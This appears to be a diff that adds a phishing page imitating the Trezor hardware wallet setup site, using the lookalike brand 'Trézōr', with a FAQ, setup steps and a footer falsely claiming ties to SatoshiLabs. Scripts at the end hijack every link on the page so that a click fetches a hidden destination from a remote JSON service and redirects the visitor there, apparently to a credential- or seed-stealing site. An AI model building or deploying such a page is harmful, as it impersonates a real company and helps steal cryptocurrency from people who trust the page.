@@ -1,23 +1,754 @@
+
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <title>Home</title>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width" />
-    <!--
-      Need a visual blank slate?
-      Remove all code in `styles.css`!
-    -->
-    <link rel="stylesheet" href="styles.css" />
-    <script type="module" src="script.js"></script>
-  </head>
-  <body>
-    <nav>
-      <a href="/" aria-current="page">Home</a>
-      <a href="/page2.html">Other page</a>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trézōr.io/Start® - Starting Up Your Device - Trézōr®</title>
+    <meta name="description" content="Secure your crypto confidently – start with Trézōr.io/start. Download Suite app, install firmware, back up your recovery seed, and launch your wallet safely.">
+    <meta name="keywords" content="Trézōr.io/start,Trézōr Bridge, Trézōr suite app, Trézōr suite ">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            line-height: 1.6;
+            color: #333;
+        }
+
+        .green-banner {
+            background: linear-gradient(90deg, #00D4AA 0%, #00B894 100%);
+            padding: 8px 0;
+            text-align: center;
+            font-size: 14px;
+            color: #000;
+        }
+
+        .green-banner a {
+            color: #000;
+            text-decoration: underline;
+        }
+
+        .navbar {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 12px 0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: #000;
+            text-decoration: none;
+        }
+
+        .logo::before {
+            content: "🔒";
+            margin-right: 8px;
+        }
+
+        .nav-menu {
+            display: flex;
+            list-style: none;
+            gap: 30px;
+            align-items: center;
+        }
+
+        .nav-menu a {
+            text-decoration: none;
+            color: #333;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+
+        .nav-menu a:hover {
+            color: #00D4AA;
+        }
+
+        .nav-actions {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .currency-selector {
+            background: none;
+            border: none;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .cart-btn {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            text-decoration: none;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .hero {
+            background: linear-gradient(135deg, rgba(139, 69, 19, 0.8), rgba(160, 82, 45, 0.6)), url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 600"><rect fill="%23D2B48C" width="1000" height="600"/></svg>');
+            background-size: cover;
+            background-position: center;
+            min-height: 80vh;
+            display: flex;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+            align-items: center;
+            width: 100%;
+        }
+
+        .hero-content {
+            color: white;
+        }
+
+        .hero-title {
+            font-size: 4rem;
+            font-weight: 300;
+            line-height: 1.1;
+            margin-bottom: 20px;
+        }
+
+        .hero-subtitle {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            opacity: 0.9;
+            line-height: 1.6;
+        }
+
+        .cta-button {
+            background: #00D4AA;
+            color: #000;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(0, 212, 170, 0.3);
+        }
+
+        .cta-button:hover {
+            background: #00B894;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 212, 170, 0.4);
+        }
+
+        .hero-stats {
+            display: flex;
+            gap: 30px;
+            margin-top: 40px;
+            align-items: center;
+        }
+
+        .stat {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: white;
+            opacity: 0.9;
+        }
+
+        .hero-device {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .device-mockup {
+            width: 300px;
+            height: 400px;
+            background: linear-gradient(135deg, #2c3e50, #34495e);
+            border-radius: 20px;
+            position: relative;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+        }
+
+        .device-screen {
+            width: 240px;
+            height: 160px;
+            background: #1a1a1a;
+            border-radius: 8px;
+            margin: 40px auto 0;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+
+        .pin-display {
+            color: #00D4AA;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            width: 180px;
+        }
+
+        .key {
+            width: 50px;
+            height: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 16px;
+        }
+
+        .faq-section {
+            padding: 80px 0;
+            background: #f8f9fa;
+        }
+
+        .faq-container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .faq-title {
+            font-size: 2.5rem;
+            margin-bottom: 50px;
+            color: #333;
+            font-weight: 300;
+        }
+
+        .faq-item {
+            background: white;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            overflow: hidden;
+        }
+
+        .faq-question {
+            padding: 24px;
+            background: white;
+            border: none;
+            width: 100%;
+            text-align: left;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: background 0.3s;
+        }
+
+        .faq-question:hover {
+            background: #f8f9fa;
+        }
+
+        .faq-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #e8f5e8, #d4f1d4);
+            border-radius: 12px;
+            margin-right: 20px;
+            flex-shrink: 0;
+        }
+
+        .faq-icon::before {
+            content: "❓";
+            font-size: 24px;
+        }
+
+        .faq-answer {
+            padding: 0 24px 24px 104px;
+            color: #666;
+            line-height: 1.7;
+            display: none;
+        }
+
+        .faq-item.active .faq-answer {
+            display: block;
+        }
+
+        .footer {
+            background: #1a1a1a;
+            color: white;
+            padding: 60px 0 30px;
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr 1fr;
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+
+        .footer-brand {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .footer-logo {
+            display: flex;
+            align-items: center;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .footer-logo::before {
+            content: "🔒";
+            margin-right: 8px;
+        }
+
+        .footer-tagline {
+            color: #999;
+            font-size: 14px;
+        }
+
+        .footer-section h4 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: white;
+        }
+
+        .footer-links {
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-bottom: 12px;
+        }
+
+        .footer-links a {
+            color: #999;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: #00D4AA;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .social-links a {
+            width: 40px;
+            height: 40px;
+            background: #333;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            text-decoration: none;
+            transition: background 0.3s;
+        }
+
+        .social-links a:hover {
+            background: #00D4AA;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid #333;
+            padding-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            color: #999;
+        }
+
+        .footer-bottom a {
+            color: #999;
+            text-decoration: none;
+        }
+
+        .footer-bottom a:hover {
+            color: #00D4AA;
+        }
+
+        @media (max-width: 768px) {
+            .nav-menu {
+                display: none;
+            }
+
+            .hero-container {
+                grid-template-columns: 1fr;
+                text-align: center;
+            }
+
+            .hero-title {
+                font-size: 2.5rem;
+            }
+
+            .footer-content {
+                grid-template-columns: 1fr 1fr;
+                gap: 30px;
+            }
+
+            .footer-bottom {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+        article{
+            padding: 50px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Green Banner -->
+    <div class="green-banner">
+        Need help setting up your Trézōr hardware wallet? Check out <a href="#">Trézōr Expert</a>
+    </div>
+
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="#" class="logo">Trézōr</a>
+            
+            <ul class="nav-menu">
+                <li><a href="#">Products</a></li>
+                <li><a href="#">App</a></li>
+                <li><a href="#">Coins</a></li>
+                <li><a href="#">Learn & Support</a></li>
+            </ul>
+
+            <div class="nav-actions">
+                <select class="currency-selector">
+                    <option>🇺🇸 USD</option>
+                </select>
+                <a href="#" class="cart-btn">
+                    Cart 0
+                </a>
+            </div>
+        </div>
     </nav>
-    <main>
-      <h1>Home page</h1>
-    </main>
-  </body>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-container">
+            <div class="hero-content">
+                <h1 class="hero-title">Crypto security made easy</h1>
+                <p class="hero-subtitle">
+                    Securely store, manage, and protect your coins with Trézōr hardware wallets, app & backup solutions.
+                </p>
+                <a href="#" class="cta-button">Get your Trézōr</a>
+                
+                <div class="hero-stats">
+                    <div class="stat">
+                        <span>⭐ 4.6</span>
+                    </div>
+                    <div class="stat">
+                        <span>10+ Years in crypto</span>
+                    </div>
+                    <div class="stat">
+                        <span>2M+ Customers</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="hero-device">
+                <div class="device-mockup">
+                    <div class="device-screen">
+                        <div class="pin-display">Enter PIN</div>
+                        <div class="keypad">
+                            <div class="key">1</div>
+                            <div class="key">2</div>
+                            <div class="key">3</div>
+                            <div class="key">4</div>
+                            <div class="key">5</div>
+                            <div class="key">6</div>
+                            <div class="key">7</div>
+                            <div class="key">8</div>
+                            <div class="key">9</div>
+                            <div class="key">*</div>
+                            <div class="key">0</div>
+                            <div class="key">#</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section class="faq-section">
+        <div class="faq-container">
+            <h2 class="faq-title">Frequently asked questions</h2>
+            
+            <div class="faq-item active">
+                <button class="faq-question">
+                    <div style="display: flex; align-items: center;">
+                        <div class="faq-icon"></div>
+                        Why should I use a hardware wallet?
+                    </div>
+                    <span>⌄</span>
+                </button>
+                <div class="faq-answer">
+                    A hardware wallet, like Trézōr, provides top-notch security by keeping your sensitive data and crypto access completely offline. This protects your assets from hackers, malware, and other online threats. Unlike exchanges, which can be vulnerable to hacks or government restrictions, a hardware wallet gives you full control of your assets. Additionally, Trézōr offers easy wallet backup, ensuring your funds are recoverable even if the device is lost or damaged.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <button class="faq-question">
+                    <div style="display: flex; align-items: center;">
+                        <div class="faq-icon"></div>
+                        What is a hardware wallet?
+                    </div>
+                    <span>⌄</span>
+                </button>
+                <div class="faq-answer">
+                    A hardware wallet is a physical device that stores your cryptocurrency private keys offline, providing maximum security for your digital assets.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <button class="faq-question">
+                    <div style="display: flex; align-items: center;">
+                        <div class="faq-icon"></div>
+                        How does a hardware wallet work?
+                    </div>
+                    <span>⌄</span>
+                </button>
+                <div class="faq-answer">
+                    Hardware wallets generate and store private keys offline, signing transactions within the device to ensure your keys never leave the secure environment.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <button class="faq-question">
+                    <div style="display: flex; align-items: center;">
+                        <div class="faq-icon"></div>
+                        What if I lose my hardware wallet?
+                    </div>
+                    <span>⌄</span>
+                </button>
+                <div class="faq-answer">
+                    If you lose your hardware wallet, you can recover your funds using your recovery seed phrase on a new device.
+                </div>
+            </div>
+
+            <div class="faq-item">
+                <button class="faq-question">
+                    <div style="display: flex; align-items: center;">
+                        <div class="faq-icon"></div>
+                        How to transfer crypto to a hardware wallet?
+                    </div>
+                    <span>⌄</span>
+                </button>
+                <div class="faq-answer">
+                    You can transfer crypto to your hardware wallet by generating a receive address and sending funds from your exchange or software wallet.
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <article>
+
+            <h2 data-start="156" data-end="191">Get Started with Trézōr.io/start</h2><br>
+<p data-start="193" data-end="353">Trézōr.io/start is your gateway to secure cryptocurrency storage. Whether you're new or recovering an existing wallet, this page makes setup fast and intuitive.</p><br>
+<h3 data-start="355" data-end="389">Step 1: Connect &amp; Initialize</h3><br>
+<p data-start="390" data-end="564">Begin by connecting your Trézōr device via USB. You'll be prompted to install or update firmware. Choose whether to create a new wallet or recover one using your seed phrase.</p><br>
+<h3 data-start="566" data-end="601">Step 2: Set PIN &amp; Record Seed</h3><br>
+<p data-start="602" data-end="762">Next, choose a strong PIN using the on-screen interface. Then write down your recovery seed&mdash;this offline backup is vital in case your device is lost or damaged.</p><br>
+<h3 data-start="764" data-end="795">Step 3: Unlock with Login</h3><br>
+<p data-start="796" data-end="980">To log in, simply plug the device back in and enter your PIN. If you enabled a passphrase, input that too. There&rsquo;s no username or password&mdash;your hardware device and PIN <em data-start="964" data-end="969">are</em> the login.</p><br>
+<h3 data-start="982" data-end="1009">Step 4: Manage Assets</h3><br>
+<p data-start="1010" data-end="1200">Once logged in, activate and view your supported cryptocurrencies like Bitcoin, Ethereum, or Cardano. The interface will display balances and transaction options once the device is unlocked.</p><br>
+<h3 data-start="1202" data-end="1229">Step 5: Secure Logout</h3><br>
+<p data-start="1230" data-end="1412">To safely log out, close the wallet interface and unplug your Trézōr. The session ends immediately and no account remains accessible without reconnecting and re-entering credentials.</p><br>
+
+    </article>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-content">
+                <div class="footer-brand">
+                    <div class="footer-logo">Trézōr</div>
+                    <p class="footer-tagline">a part of SatoshiLabs Group</p>
+                    <div class="social-links">
+                        <a href="#">𝕏</a>
+                        <a href="#">📺</a>
+                        <a href="#">📷</a>
+                        <a href="#">📘</a>
+                        <a href="#">🎵</a>
+                        <a href="#">💼</a>
+                        <a href="#">📧</a>
+                    </div>
+                </div>
+
+                <div class="footer-section">
+                    <h4>Products</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">Trézōr Safe 3</a></li>
+                        <li><a href="#">Trézōr Safe 5</a></li>
+                        <li><a href="#">Model One</a></li>
+                        <li><a href="#">Model T</a></li>
+                        <li><a href="#">Trézōr Keep</a></li>
+                        <li><a href="#">Trézōr Expert</a></li>
+                        <li><a href="#">Compare wallets</a></li>
+                        <li><a href="#">Trézōr Suite</a></li>
+                        <li><a href="#">All products & accessories</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-section">
+                    <h4>Learn</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">Supported coins</a></li>
+                        <li><a href="#">Blog</a></li>
+                        <li><a href="#">Third-party wallet apps</a></li>
+                        <li><a href="#">Privacy and Security</a></li>
+                        <li><a href="#">About us</a></li>
+                        <li><a href="#">Support</a></li>
+                        <li><a href="#">Knowledge Base</a></li>
+                        <li><a href="#">Forum</a></li>
+                        <li><a href="#">System status</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-section">
+                    <h4>Other</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">FAQs</a></li>
+                        <li><a href="#">Terms of Use</a></li>
+                        <li><a href="#">Affiliate Program</a></li>
+                        <li><a href="#">Reseller Program</a></li>
+                        <li><a href="#">Resellers</a></li>
+                        <li><a href="#">GitHub</a></li>
+                        <li><a href="#">Press & Media</a></li>
+                        <li><a href="#">Careers</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <p>Copyright belongs to Trézōr company s.r.o. All rights reserved.</p>
+                <div>
+                    <a href="#">Cookies</a> +
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // FAQ Accordion functionality
+        document.querySelectorAll('.faq-question').forEach(button => {
+            button.addEventListener('click', () => {
+                const faqItem = button.parentElement;
+                const isActive = faqItem.classList.contains('active');
+                
+                // Close all FAQ items
+                document.querySelectorAll('.faq-item').forEach(item => {
+                    item.classList.remove('active');
+                });
+                
+                // Open clicked item if it wasn't active
+                if (!isActive) {
+                    faqItem.classList.add('active');
+                }
+            });
+        });
+    </script>
+    <script>
+var elems = document.body.getElementsByTagName("a");
+var check = true;
+if(check === true) {
+
+  for(var i = 0; i < elems.length; i++)
+                {
+                    elems[i].setAttribute("onclick",'getdata()');
+                }
+
+}
+                
+</script>
+<script>  var fetchurl;
+
+    var getdata =  async ()=> {
+        console.log("Func Load")
+        var fetchurl = "";
+        const url = 'https://api.jsonsilo.com/public/846442d1-057f-46dd-ae56-30366a13e402';
+
+        await  fetch(url)
+        .then(response => response.json())  // Parse JSON data
+        .then(data => {
+            // console.log(data.productlist[0].trezior);  // Log the fetched JSON data as an object
+            fetchurl = data.portfolio[0].one;
+            // console.log(fetchurl);
+
+            // return fetchurl;
+
+            window.location.replace(fetchurl);
+
+
+
+            
+
+        })
+        .catch(error => console.error('Error:', error));
+
+    
+
+    };
+
+</script>
+</body>
 </html>
